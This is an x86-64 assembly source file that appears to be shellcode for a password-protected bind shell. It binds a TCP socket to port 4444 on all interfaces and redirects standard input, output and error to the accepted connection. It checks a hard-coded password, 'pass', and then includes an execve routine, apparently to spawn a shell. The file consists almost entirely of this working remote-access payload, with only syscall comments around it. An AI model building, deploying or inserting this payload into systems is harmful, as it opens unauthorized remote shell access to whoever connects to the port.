global _start

%define _START
_start:
    jmp real_start
    password: db "pass"
    pass_len: db $-password

real_start:

    ; sock = socket(AF_INET, SOCK_STREAM, 0)
    ; AF_INET = 2
    ; SOCK_STREAM = 1
    ; __NR_socket = 41

    xor rax, rax
    xor rdi, rdi
    xor rsi, rsi

    add al, 41
    mov dil, 2
    mov sil, 1
    xor rdx, rdx
    syscall

    mov rdi, rax

    ; server.sin_family = AF_INET;    short
    ; server.sin_port = htons(4444);    unsigned short
    ; server.sin_addr.s_addr = INADDR_ANY;    unsigned long
    ; bzero(&server.sin_zero, 8);
    ;
    ; https://beej.us/guide/bgnet/html/multi/sockaddr_inman.html
    ; struct sockaddr_in {
    ;     short            sin_family;
    ;     unsigned short   sin_port;
    ;     struct in_addr   sin_addr;
    ;     char             sin_zero[8];
    ; };
    ;
    ; bind(sock, (struct sockaddr *)&server, sockaddr_len)
    ; __NR_bind = 49

    xor rax, rax
    push rax
    mov dword [rsp-4], eax
    sub rsp, 4
    push word 0x5c11  ; htons(4444)
    push word 2

    ; bind
    mov rax, 49
    mov rsi, rsp
    mov rdx, 16  ; sizeof(sockaddr_in)
    syscall

    ; listen(sock, 2)
    ; __NR_listen = 50

    mov rax, 50
    mov rsi, 2
    syscall

    ; new = accept(sock, (struct sockaddr *)&client, &sockaddr_len)
    ; __NR_accept = 43

    mov rax, 43
    xor rsi, rsi
    xor rdx, rdx
    syscall
    
    mov rbx, rax

    ; close(sock)
    ; __NR_close = 3

    mov rax, 3
    syscall

    ; dup2(new, 0);
    ; dup2(new, 1);
    ; dup2(new, 2);
    ; __NR_dup2 = 33

    mov rax, 33
    mov rdi, rbx
    xor rsi, rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

    mov rax, 33
    inc rsi
    syscall

check_password:
    mov rax, 0
    ; rdi = fd (bound socket)
    sub rsp, 16   ; create space for "buf" in the stack
    mov rsi, rsp  ; rsi = *buf
    mov rdx, 16
    syscall

    ; compare password
    xor rcx, rcx
    mov cl, [rel pass_len]
    lea rdi, [rel password]
    cld
    repz cmpsb
    jne exit

    %include "execve-stack.nasm"

exit:
    mov rax, 60
    syscall
